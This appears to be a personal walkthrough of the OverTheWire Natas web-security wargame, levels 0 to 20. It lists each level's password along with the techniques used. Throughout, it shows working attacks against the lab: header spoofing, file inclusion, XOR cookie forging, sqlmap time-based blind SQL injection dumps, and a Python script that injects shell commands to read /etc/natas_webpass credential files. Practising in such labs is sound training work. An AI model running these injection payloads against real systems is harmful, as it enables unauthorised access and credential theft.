# Natas

**Natas teaches the basics of serverside web-security.

- Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number.    
- There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.      
- Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up.     
- All passwords are also stored in /etc/natas_webpass/.

  

## Natas Level 0 
Username:``` natas0```      
Password: ```natas0```      
URL: http://natas0.natas.labs.overthewire.org

**By review the source code**
```zsh
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
</body>
</html>
```

## Natas Level 0 → Level 1

Username: natas1
URL:      http://natas1.natas.labs.overthewire.org

```zsh
curl -v http://natas1.natas.labs.overthewire.org/ -u natas1 
Enter host password for user 'natas1':
* Host natas1.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 56.228.72.241
*   Trying 56.228.72.241:80...
* Connected to natas1.natas.labs.overthewire.org (56.228.72.241) port 80
* Server auth using Basic with user 'natas1'
> GET / HTTP/1.1
> Host: natas1.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMxOjBuekNpZ0FxN3QyaUFMeXZVOXhjSGxZT
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sun, 14 Sep 2025 16:13:31 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Last-Modified: Fri, 15 Aug 2025 13:06:35 GMT
< ETag: "427-63c670f40d5c5"
< Accept-Ranges: bytes
< Content-Length: 1063
< Vary: Accept-Encoding
< Content-Type: text/html
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas1", "pass": "0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>
</body>
</html>
```

## Natas Level 1 → Level 2

Username: natas2
URL:      http://natas2.natas.labs.overthewire.org

http://natas2.natas.labs.overthewire.org/
![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas2-1.png)
Source code review
![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas2-2.png)

![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas2-3.png)

![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas2-4.png)

```zsh

http://natas2.natas.labs.overthewire.org/files/users.txt

# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Natas Level 2 → Level 3

Username: natas3
URL:      http://natas3.natas.labs.overthewire.org



![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/nastas3-1.png)


![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/nastas3-2.png)


![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/nastas3-3.png)


![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/nastas3-4.png)



```zsh
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```




## Natas Level 3 → Level 4
Username: natas5
URL:      http://natas4.natas.labs.overthewire.org
```**For this level you need burpsuite or zap owasp to modifie the request **```
![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/nastas4-1.png)


Catch the Request on Burpsuite and send it to Repecter




![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas4-2.png)


By this








```Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"``` you see it said ```authorized users should come only from ```
it is like refering some other place like ```http://natas5.natas.labs.overthewire.org``` when you see the request it contant the refers header.







![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas4-3.png)
Boom

```zsh

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

```

----
## Natas Level 4 → Level 5


Username: natas5
URL:      http://natas5.natas.labs.overthewire.org

![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/nastas5-1.png)
![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/nastas5-2.png)
![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/nastas5-3.png)

```zsh  
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```
----
## Natas Level 5 → Level 6

Username: natas6
URL:      http://natas6.natas.labs.overthewire.org

![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas6-1.png)


The form compares the submitted secret value to the one stored in includes/secret.inc


![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas6-2.png)





browse to ```http://natas6.natas.labs.overthewire.org/includes/secret.inc``` displayed secret value into the form input to receive the password for Natas7.




![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas6-3.png)




![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas6-4.png)



Enter that secret in the web form and submit.


![image](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas6-5.png)

```zsh
Access granted.          
The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

## Natas Level 6 → Level 7

Username: natas7
URL:      http://natas7.natas.labs.overthewire.org
this is LFI(local file inclusion ) types of Vulnerablitie

![natas7 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/raw/main/overthewire/files/natas/natas7.gif)

```zsh 
natas8 : xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

## Natas Level 7 → Level 8

Username: natas8
URL:      http://natas8.natas.labs.overthewire.org

![natas8 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/raw/main/overthewire/files/natas/natas8.gif)

```zsh 
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t 
```

## Natas Level 8 → Level 9

Username: natas9
URL :     http://natas9.natas.labs.overthewire.org

![natas9 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/raw/main/overthewire/files/natas/natas9.gif)

```zsh
natas10 :  t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

```

## Natas Level 9 → Level 10

Username: natas10
URL:      http://natas10.natas.labs.overthewire.org
```txt
my mistake it found the worng password
the path of correct password is /etc/netas_webpass/natas11
you can replace it with /tmp/pass
the payload
[a-zA-Z0-9] /etc/natas_webpass/natas11 #
```
Refer's : [bypass of special character](https://stackoverflow.com/questions/76836086/xss-payload-that-can-bypass-special-character-check)

![natas10 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas10.gif)

```zsh

/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

```
#3# Natas Level 10 → Level 11
Username: natas11
URL:      http://natas11.natas.labs.overthewire.org

In this level i take the help from gpt to understand the code and working machinism
And also write the code to solve this level

This code is trying to brute-force or guess the XOR key by XORing the encrypted cookie with the known structure of the plaintext.

It assumes that the JSON in the cookie is something like:
{"showpassword":"no","bgcolor":"#ffffff"}
```python
import base64

cipher_b64 = ""
cipher = base64.b64decode(" <url_decode_cookies_data> ")
plaintext = b'{"showpassword":"no","bgcolor":"#ffffff"}'

key_stream = bytes([c ^ p for c, p in zip(cipher, plaintext)])
print("Guessed repeating key:", key_stream[:4])
```
 XOR logic

XOR (exclusive or) is a reversible operation:

A XOR B = C

C XOR B = A → You can get the plaintext back

C XOR A = B → You can get the key back


cipher XOR plaintext = key


```python
import json
import base64

def xor_encrypt(data, key):
    out = ''
    for i in range(len(data)):
        out += chr(ord(data[i]) ^ ord(key[i % len(key)]))
    return out

new_data = json.dumps({
    "showpassword": "yes",
    "bgcolor": "#ffffff"
})

key = 'eDWo'

encrypted = xor_encrypt(new_data, key)
cookie = base64.b64encode(encrypted.encode()).decode()

print("New Cookie Value:", cookie)

```
the password i got 

```
The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

## Natas Level 11 → Level 12

Username: natas12
URL:      http://natas12.natas.labs.overthewire.org

![natas12 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas12.gif)

```zsh
natas13 : trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

```

## Natas Level 12 → Level 13

Username: natas13
URL:      http://natas13.natas.labs.overthewire.org

![natas13 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas13.gif)

```zsh

natas14 : z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

```
## Natas Level 13 → Level 14

Username: natas14
URL:      http://natas14.natas.labs.overthewire.org

![natas13 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas14.gif)

```zsh
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

## Natas Level 14 → Level 15

Username: natas15
URL:      http://natas15.natas.labs.overthewire.org

It take a half hours for sqlijection and dump all the cred 

![natas13 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas15.gif)

```zsh  
┌──(kali㉿kali)-[/media/…/ctf/Other/overthewire/natas]
└─$ sqlmap -r natas  --dump
        ___
       __H__                                                                                                                        
 ___ ___[.]_____ ___ ___  {1.9.9#stable}                                                                                            
|_ -| . [(]     | .'| . |                                                                                                           
|___|_  ["]_|_|_|__,|  _|                                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:54:23 /2025-09-18/

[20:54:23] [INFO] parsing HTTP request from 'natas'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] 

[20:54:24] [INFO] resuming back-end DBMS 'mysql' 
[20:54:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=" AND (SELECT 7797 FROM (SELECT(SLEEP(5)))QDlB) AND "tPdO"="tPdO
---
[20:54:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[20:54:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[20:54:26] [INFO] fetching current database
[20:54:26] [INFO] resumed: natas15
[20:54:26] [INFO] fetching tables for database: 'natas15'
[20:54:26] [INFO] fetching number of tables for database 'natas15'
[20:54:26] [INFO] resumed: 1
[20:54:26] [INFO] resumed: users
[20:54:26] [INFO] fetching columns for table 'users' in database 'natas15'
[20:54:26] [INFO] resumed: 2
[20:54:26] [INFO] resumed: username
[20:54:26] [INFO] resumed: password
[20:54:26] [INFO] fetching entries for table 'users' in database 'natas15'
[20:54:26] [INFO] fetching number of entries for table 'users' in database 'natas15'
[20:54:26] [INFO] resumed: 4
[20:54:26] [INFO] resumed: 6P151OntQe
[20:54:26] [INFO] resumed: bob
[20:54:26] [INFO] resumed: HLwuGKts2w
[20:54:26] [INFO] resumed: charlie
[20:54:26] [INFO] resumed: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
[20:54:26] [INFO] resumed: natas16
[20:54:26] [INFO] resumed: hROtsfM734
[20:54:26] [INFO] resumed: alice
Database: natas15
Table: users
[4 entries]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 6P151OntQe                       | bob      |
| HLwuGKts2w                       | charlie  |
| hPkjKYviLQctEW33QmuXL6eDVfMW4sGo | natas16  |
| hROtsfM734                       | alice    |
+----------------------------------+----------+

[20:54:26] [INFO] table 'natas15.users'

```

## Natas Level 15 → Level 16

Username: natas16
URL:      http://natas16.natas.labs.overthewire.org

i try use GPT TO solve this level and understanding the code and what payload should use 

```python3 
#!/usr/bin/env python3
import aiohttp
import asyncio
import string
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Constants
URL = "http://natas16.natas.labs.overthewire.org"
AUTH_USERNAME = "natas16"
AUTH_PASSWORD = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
CHARSET = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
PASSWORD_LENGTH = 32
CONCURRENT_REQUESTS = 5  # Reduced to avoid server throttling
MAX_RETRIES = 3  # Retry failed requests up to 3 times
TIMEOUT = 5  # Timeout per request in seconds

async def check_character(session, password_prefix, char, semaphore, position, retry=0):
    """Check if a character is part of the password asynchronously with retries."""
    async with semaphore:
        try:
            needle = f"$(grep -E ^{password_prefix}{char}.* /etc/natas_webpass/natas17)hackers"
            async with session.get(
                URL,
                params={"needle": needle},
                timeout=TIMEOUT
            ) as response:
                response.raise_for_status()
                text = await response.text()
                return char, 'hackers' not in text
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            if retry < MAX_RETRIES:
                logger.warning(f"Retry {retry + 1}/{MAX_RETRIES} for char '{char}' at position {position}: {e}")
                await asyncio.sleep(0.5)  # Brief delay before retry
                return await check_character(session, password_prefix, char, semaphore, position, retry + 1)
            logger.error(f"Request failed for char '{char}' at position {position} after {MAX_RETRIES} retries: {e}")
            return char, False

async def check_position(session, password_prefix, position, semaphore):
    """Test all characters for a given position and return the correct one."""
    tasks = [check_character(session, password_prefix, char, semaphore, position) for char in CHARSET]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for char, is_correct in results:
        if isinstance(is_correct, Exception):
            logger.warning(f"Exception for char '{char}' at position {position}: {is_correct}")
            continue
        if is_correct:
            logger.info(f"Position {position}: Found character '{char}', Password so far: {password_prefix + char}")
            return char
    logger.warning(f"No character found at position {position}")
    return None

async def test_server(session):
    """Test if the server is reachable."""
    try:
        async with session.get(URL, timeout=TIMEOUT) as response:
            response.raise_for_status()
            logger.info("Server is reachable.")
            return True
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.error(f"Server unreachable: {e}")
        return False

async def main():
    password = []
    semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)  # Limit concurrent requests
    
    logger.info("Starting password extraction...")
    
    async with aiohttp.ClientSession(auth=aiohttp.BasicAuth(AUTH_USERNAME, AUTH_PASSWORD)) as session:
        # Test server connectivity
        if not await test_server(session):
            logger.error("Aborting due to server connectivity issues.")
            return
        
        for position in range(1, PASSWORD_LENGTH + 1):
            char = await check_position(session, ''.join(password), position, semaphore)
            if char:
                password.append(char)
            else:
                logger.error(f"Failed to find character at position {position}. Stopping.")
                break

    final_password = ''.join(password)
    if len(final_password) == PASSWORD_LENGTH:
        logger.info(f"Password extraction complete. Final password: {final_password}")
    else:
        logger.error(f"Incomplete password: {final_password} (Length: {len(final_password)})")

if __name__ == "__main__":
    asyncio.run(main())

```

```zsh  
Position 32: Found character 'C', Password so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

```
## Natas Level 16 → Level 17

Username: natas17
URL:      http://natas17.natas.labs.overthewire.org

```zsh
┌──(kali㉿kali)-[/media/…/ctf/Other/overthewire/natas]
└─$ sqlmap -r natas17  --dbms=mysql --technique=t --level=5 --risk=3 -dump 
        ___
       __H__                                                                                                                                           
 ___ ___[']_____ ___ ___  {1.9.9#stable}                                                                                                               
|_ -| . [,]     | .'| . |                                                                                                                              
|___|_  [,]_|_|_|__,|  _|                                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:41:26 /2025-09-18/

[23:41:26] [INFO] parsing HTTP request from 'natas17'
[23:41:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas17" AND (SELECT 2023 FROM (SELECT(SLEEP(5)))HHFX)-- bfjo
---
[23:41:28] [INFO] testing MySQL
[23:41:28] [INFO] confirming MySQL
[23:41:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 8.0.0
[23:41:28] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[23:41:28] [INFO] fetching current database
[23:41:28] [INFO] resumed: natas17
[23:41:28] [INFO] fetching tables for database: 'natas17'
[23:41:28] [INFO] fetching number of tables for database 'natas17'
[23:41:28] [INFO] resumed: 1
[23:41:28] [INFO] resumed: users
[23:41:28] [INFO] fetching columns for table 'users' in database 'natas17'
[23:41:28] [INFO] resumed: 2
[23:41:28] [INFO] resumed: username
[23:41:28] [INFO] resumed: password
[23:41:28] [INFO] fetching entries for table 'users' in database 'natas17'
[23:41:28] [INFO] fetching number of entries for table 'users' in database 'natas17'
[23:41:28] [INFO] resumed: 4
[23:41:28] [INFO] resumed: 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd
[23:41:28] [INFO] resumed: \x02
[23:41:28] [INFO] resumed: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
[23:41:28] [INFO] resumed: natas18
[23:41:28] [INFO] resumed: MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2
[23:41:28] [INFO] resumed: A
[23:41:28] [INFO] resumed: VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD
[23:41:28] [INFO] resumed: user3
Database: natas17
Table: users
[4 entries]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd |         |
| 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ | natas18  |
| MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 | A        |
| VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD | user3    |
+----------------------------------+----------+

[23:41:28] [INFO] table 'natas17.users'

```

## Natas Level 17 → Level 18

Username: natas18
URL:      http://natas18.natas.labs.overthewire.org

![natas18 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas18.gif) 

```zsh

Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

```
## Natas Level 18 → Level 19


Username: natas19
URL:      http://natas19.natas.labs.overthewire.org

![natas19 demo](https://github.com/nikhil-ji-first/all-Exploit-notes/blob/main/overthewire/files/natas/natas19.gif)


```zsh

You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

```



## Natas Level 19 → Level 20

Username: natas20
URL:      http://natas20.natas.labs.overthewire.org

```txt
POST /index.php HTTP/1.1
Host: natas20.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://natas20.natas.labs.overthewire.org
DNT: 1
Sec-GPC: 1
Authorization: Basic bmF0YXMyMDpwNW1DdlA3R1MySzZCbXQzZ3FoTTJGYzFBNVQ4TVZ5dw==
Connection: keep-alive
Referer: http://natas20.natas.labs.overthewire.org/index.php
Cookie: PHPSESSID=fndjq952mceaq4hivld730tim3
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=test%23
admin+1

```
payload name=admin#
admin 1

```zsh
Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

```
